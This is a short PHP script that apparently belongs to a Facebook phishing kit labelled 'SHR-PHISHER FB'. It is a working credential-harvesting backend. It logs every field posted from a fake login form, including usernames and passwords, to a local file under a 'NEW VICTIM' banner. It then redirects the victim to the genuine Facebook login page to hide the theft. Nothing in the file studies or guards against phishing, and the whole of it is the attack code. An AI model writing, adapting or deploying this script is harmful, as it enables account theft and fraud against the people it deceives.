<?php
// PHP Script to capture user credentials
$handle = fopen("usernames.txt", "a");
$date = date('Y-m-d H:i:s');
fwrite($handle, "---------- NEW VICTIM (SHR-PHISHER FB) - $date ----------\n");

// Capturing all POST data including the selected followers
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fwrite($handle, "---------------------------------------------------------\n\n");
fclose($handle);

// Redirect the user back to the official Facebook login
header("Location: https://www.facebook.com/login/");
exit;
?>
